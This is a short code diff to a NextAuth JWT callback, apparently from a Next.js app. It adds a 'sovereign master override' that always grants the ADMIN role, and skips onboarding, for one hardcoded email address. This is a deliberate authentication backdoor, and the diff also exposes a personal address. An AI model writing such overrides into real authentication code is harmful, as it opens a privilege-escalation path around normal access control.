@@ -44,11 +44,20 @@ export const authOptions: NextAuthOptions = {
   session: { strategy: "jwt" },
   callbacks: {
     async jwt({ token, user, trigger, session }: any) {
+      // 1. Initial User Connection
       if (user) {
         token.id = user.id;
         token.role = user.role;
         token.isOnboarded = user.isOnboarded;
       }
+      
+      // 2. SOVEREIGN MASTER OVERRIDE: zomatube2012@gmail.com is ALWAYS an ADMIN
+      if (token.email === "zomatube2012@gmail.com") {
+        token.role = "ADMIN";
+        token.isOnboarded = true; // Skip onboarding for master admin
+      }
+
+      // 3. Dynamic Updates
       if (trigger === "update" && session) {
         token.isOnboarded = session.isOnboarded;
       }
